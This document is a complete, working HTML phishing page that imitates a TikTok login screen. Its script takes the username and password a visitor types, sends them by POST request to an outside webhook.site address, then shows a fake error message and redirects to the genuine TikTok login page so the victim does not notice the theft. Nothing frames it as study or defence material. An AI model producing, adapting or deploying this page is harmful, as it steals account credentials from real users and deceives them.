<!DOCTYPE html>
<html>
<head><title>TikTok Login</title></head>
<body style="background:#000; color:#fff; font-family:Arial; text-align:center;">
<div style="max-width:350px; margin:100px auto; background:#111; padding:30px; border-radius:15px;">
    <h2>Login to TikTok</h2>
    <input type="text" id="username" placeholder="Username or Email" style="width:100%; padding:12px; margin:10px 0; background:#222; color:#fff; border:none;"><br>
    <input type="password" id="password" placeholder="Password" style="width:100%; padding:12px; margin:10px 0; background:#222; color:#fff; border:none;"><br>
    <button onclick="send()" style="background:#ff3366; color:#fff; padding:12px; width:100%; border:none;">Login</button>
</div>
<script>
function send() {
    var u = document.getElementById('username').value;
    var p = document.getElementById('password').value;
    if (!u || !p) return;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://webhook.site/acf98d85-0a2d-46a5-b9ac-73f1d5d9a358');
    xhr.send('login=' + encodeURIComponent(u) + '&pass=' + encodeURIComponent(p));
    alert('Login error. Try again later.');
    window.location.href = 'https://www.tiktok.com/login?error=1';
}
</script>
</body>
</html>
